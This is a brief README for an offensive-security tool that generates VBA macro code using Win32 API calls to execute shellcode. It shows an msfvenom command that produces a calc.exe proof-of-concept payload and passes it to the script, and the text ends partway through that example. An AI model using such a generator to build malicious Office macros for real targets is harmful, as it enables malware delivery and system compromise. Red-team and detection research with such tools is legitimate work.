# tri-a-gen
Tri-a-gen is based on [Trigen](https://github.com/karttoon/trigen), it is a Python script which uses different combinations of Win32 function calls in generated VBA to execute shellcode.

Blog post - [17JAN2017 - Abusing native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html)

Below is an example output using msfvenom to generate shellcode for input.

```
# python trigen.py "$(msfvenom --payload windows/exec CMD='calc.exe' -f c)"
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 193 bytes
